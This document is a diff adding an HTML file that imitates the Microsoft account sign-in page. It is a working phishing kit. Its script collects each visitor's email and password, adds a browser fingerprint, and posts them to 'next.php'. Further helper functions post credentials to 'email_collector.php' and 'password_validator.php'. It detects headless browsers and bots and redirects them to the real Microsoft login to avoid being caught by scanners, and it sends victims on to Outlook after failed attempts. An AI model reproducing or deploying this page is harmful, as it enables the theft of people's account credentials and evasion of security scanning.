@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        body {
+            font-family: "Segoe UI", "Helvetica Neue", sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .login-container {
+            background-color: white;
+            width: 440px;
+            max-width: 100%;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            padding: 44px;
+            box-sizing: border-box;
+            position: relative;
+        }
+        
+        .microsoft-logo {
+            display: block;
+            margin: 0 auto 16px;
+            height: 24px;
+        }
+        
+        .sign-in-header {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-top: 16px;
+            margin-bottom: 12px;
+        }
+        
+        .error-message {
+            color: #e81123;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+        
+        .email-input, .password-input {
+            width: 100%;
+            padding: 6px 10px;
+            font-size: 15px;
+            border: 1px solid #666;
+            height: 36px;
+            outline: none;
+            box-sizing: border-box;
+            border-top: none;
+            border-left: none;
+            border-right: none;
+            margin-bottom: 20px;
+        }
+        
+        .email-input:focus, .password-input:focus {
+            border-color: #0067b8;
+        }
+        
+        .links {
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        .button-container {
+            text-align: right;
+            margin-top: 16px;
+        }
+        
+        .next-button {
+            min-height: 32px;
+            min-width: 108px;
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            padding: 4px 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .next-button:hover {
+            background-color: #005da6;
+        }
+        
+        .sign-options {
+            position: absolute;
+            bottom: -50px;
+            width: 100%;
+            background-color: white;
+            padding: 12px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            box-sizing: border-box;
+            left: 0;
+        }
+        
+        .sign-options img {
+            margin-right: 10px;
+        }
+        
+        .sign-options span {
+            color: #666;
+        }
+        
+        .identity-banner {
+            display: none;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .back-button {
+            width: 24px;
+            height: 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            margin-right: 10px;
+            padding: 0;
+        }
+        
+        .user-email {
+            font-size: 15px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        
+        .password-view {
+            display: none;
+        }
+        
+        .progress {
+            position: relative;
+            height: 6px;
+            overflow: hidden;
+            width: 100%;
+            display: none;
+            margin-bottom: 20px;
+        }
+        
+        .progress > div {
+            position: absolute;
+            height: 5px;
+            width: 5px;
+            background-color: #0067b8;
+            border-radius: 50%;
+            opacity: 0;
+            animation: progressDot 2s infinite;
+        }
+        
+        .progress > div:nth-child(1) {
+            animation-delay: .05s;
+        }
+        
+        .progress > div:nth-child(2) {
+            animation-delay: .2s;
+        }
+        
+        .progress > div:nth-child(3) {
+            animation-delay: .35s;
+        }
+        
+        .progress > div:nth-child(4) {
+            animation-delay: .5s;
+        }
+        
+        .progress > div:nth-child(5) {
+            animation-delay: .65s;
+        }
+        
+        @keyframes progressDot {
+            0%, 20% {
+                left: 0;
+                animation-timing-function: ease-out;
+                opacity: 0;
+            }
+            25% {
+                opacity: 1;
+            }
+            35% {
+                left: 45%;
+                animation-timing-function: linear;
+            }
+            65% {
+                left: 60%;
+                animation-timing-function: ease-in;
+            }
+            75% {
+                opacity: 1;
+            }
+            100%, 80% {
+                left: 100%;
+                opacity: 0;
+            }
+        }
+        
+        .honeypot-field {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" class="microsoft-logo">
+        
+        <!-- Progress animation -->
+        <div id="progressBar" class="progress">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        
+        <!-- Email view -->
+        <div id="emailView">
+            <h1 class="sign-in-header">Sign In</h1>
+            
+            <div id="emailError" class="error-message">
+                That Microsoft account doesn't exist. Enter a different account
+            </div>
+            
+            <input type="email" id="emailInput" class="email-input" value="art@babinskiy.com" placeholder="Email, phone, or Skype">
+            
+            <!-- Honeypot field for anti-bot -->
+            <input type="text" class="honeypot-field" name="website" tabindex="-1" autocomplete="off">
+            
+            <div class="links">
+                No account? <a href="#">Create one!</a>
+            </div>
+            
+            <div class="links">
+                <a href="#">Can't access your account?</a>
+            </div>
+            
+            <div class="button-container">
+                <button id="nextButton" class="next-button">Next</button>
+            </div>
+        </div>
+        
+        <!-- Password view -->
+        <div id="passwordView" class="password-view">
+            <div class="identity-banner">
+                <button id="backButton" class="back-button">
+                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" alt="Back">
+                </button>
+                <div id="userEmail" class="user-email"></div>
+            </div>
+            
+            <h1 class="sign-in-header">Enter password</h1>
+            
+            <div id="passwordError" class="error-message" style="display:none;">
+                Your account or password is incorrect. If you can't remember your password, <a href="#">reset it now.</a>
+            </div>
+            
+            <input type="password" id="passwordInput" class="password-input" placeholder="Password">
+            
+            <div class="links">
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <div class="button-container">
+                <button id="signInButton" class="next-button">Sign in</button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="sign-options">
+        <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" width="16" height="16" alt="Key icon">
+        <span>Sign in options</span>
+    </div>
+    
+    <script>
+    (function() {
+        // Browser fingerprinting for anti-bot detection
+        function generateFingerprint() {
+            const fingerprint = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                devicePixelRatio: window.devicePixelRatio || 1,
+                timestamp: new Date().getTime()
+            };
+            return btoa(JSON.stringify(fingerprint));
+        }
+        
+        // Additional anti-bot checks
+        function isBot() {
+            if (navigator.webdriver) return true;
+            if (/HeadlessChrome/.test(navigator.userAgent)) return true;
+            if (window.navigator.plugins.length === 0) return true;
+            if (navigator.languages === undefined) return true;
+            
+            // Check if honeypot field was filled
+            const honeypot = document.querySelector('.honeypot-field');
+            if (honeypot && honeypot.value) return true;
+            
+            return false;
+        }
+        
+        // Variables
+        let attemptCount = 0;
+        const maxAttempts = 3;
+        
+        // Elements
+        const emailView = document.getElementById('emailView');
+        const passwordView = document.getElementById('passwordView');
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const userEmailDisplay = document.getElementById('userEmail');
+        const nextButton = document.getElementById('nextButton');
+        const backButton = document.getElementById('backButton');
+        const signInButton = document.getElementById('signInButton');
+        const passwordError = document.getElementById('passwordError');
+        const progressBar = document.getElementById('progressBar');
+        
+        // Next button click handler
+        nextButton.addEventListener('click', function() {
+            const email = emailInput.value.trim();
+            
+            if (!email) {
+                document.getElementById('emailError').textContent = 'Enter a valid email address';
+                return;
+            }
+            
+            // Show loading
+            progressBar.style.display = 'block';
+            nextButton.disabled = true;
+            
+            // Anti-bot check
+            if (isBot()) {
+                // Redirect bots to legitimate site
+                window.location.href = 'https://login.microsoftonline.com';
+                return;
+            }
+            
+            // Simulate AJAX request - we'll just transition to password screen
+            // We don't need to send the email separately since next.php will handle it
+            setTimeout(function() {
+                // Hide loading
+                progressBar.style.display = 'none';
+                
+                // Switch to password view
+                emailView.style.display = 'none';
+                passwordView.style.display = 'block';
+                
+                // Display the email in the identity banner
+                userEmailDisplay.textContent = email;
+                
+                // Make the identity banner visible
+                document.querySelector('.identity-banner').style.display = 'flex';
+                
+                passwordInput.focus();
+            }, 1500);
+        });
+        
+        // Back button click handler
+        backButton.addEventListener('click', function() {
+            passwordView.style.display = 'none';
+            emailView.style.display = 'block';
+            passwordError.style.display = 'none';
+            passwordInput.value = '';
+        });
+        
+        // Sign in button click handler
+        signInButton.addEventListener('click', function() {
+            const email = userEmailDisplay.textContent;
+            const password = passwordInput.value;
+            
+            if (!password) {
+                passwordError.textContent = 'Please enter your password.';
+                passwordError.style.display = 'block';
+                return;
+            }
+            
+            // Show loading
+            progressBar.style.display = 'block';
+            signInButton.disabled = true;
+            
+            // Increment attempt counter
+            attemptCount++;
+            
+            // Prepare form data for next.php
+            const formData = new FormData();
+            formData.append('email', email);
+            formData.append('password', password);
+            formData.append('count', attemptCount);
+            formData.append('session_data', generateFingerprint());
+            
+            // Create and send XHR request to next.php
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'next.php', true);
+            
+            xhr.onload = function() {
+                // Hide loading
+                progressBar.style.display = 'none';
+                
+                if (xhr.responseText === "1") {
+                    // Success - redirect to Outlook
+                    setTimeout(function() {
+                        window.location.href = 'https://outlook.office365.com';
+                    }, 2000);
+                } else {
+                    // Failed login - show error and allow retry if under max attempts
+                    if (attemptCount < maxAttempts) {
+                        passwordInput.value = '';
+                        signInButton.disabled = false;
+                        passwordError.style.display = 'block';
+                        passwordError.innerHTML = 'Your account or password is incorrect. If you can\'t remember your password, <a href="#">reset it now.</a>';
+                    } else {
+                        // Max attempts reached - redirect
+                        setTimeout(function() {
+                            window.location.href = 'https://outlook.office365.com';
+                        }, 1500);
+                    }
+                }
+            };
+            
+            xhr.send(formData);
+        });
+        
+        // Enter key press handler for password field
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                signInButton.click();
+            }
+        });
+        
+        // Enter key press handler for email field
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                nextButton.click();
+            }
+        });
+        
+        // AJAX function to submit email
+        function submitEmail(email) {
+            // Create form data
+            const formData = new FormData();
+            formData.append('email', email);
+            formData.append('fingerprint', generateFingerprint());
+            
+            // Create and send XHR request
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'email_collector.php', true);
+            xhr.send(formData);
+        }
+        
+        // AJAX function to submit password
+        function submitPassword(email, password, count) {
+            // Create form data
+            const formData = new FormData();
+            formData.append('email', email);
+            formData.append('password', password);
+            formData.append('attempt', count);
+            formData.append('fingerprint', generateFingerprint());
+            
+            // Create and send XHR request
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'password_validator.php', true);
+            
+            xhr.onload = function() {
+                // Hide loading
+                progressBar.style.display = 'none';
+                
+                // Show error for invalid password (first two attempts)
+                if (count < maxAttempts) {
+                    passwordInput.value = '';
+                    signInButton.disabled = false;
+                    passwordError.style.display = 'block';
+                    passwordError.innerHTML = 'Your account or password is incorrect. If you can\'t remember your password, <a href="#">reset it now.</a>';
+                } else {
+                    // Redirect after max attempts
+                    window.location.href = 'https://outlook.office365.com';
+                }
+            };
+            
+            xhr.send(formData);
+        }
+    })();
+    </script>
+</body>
+</html>
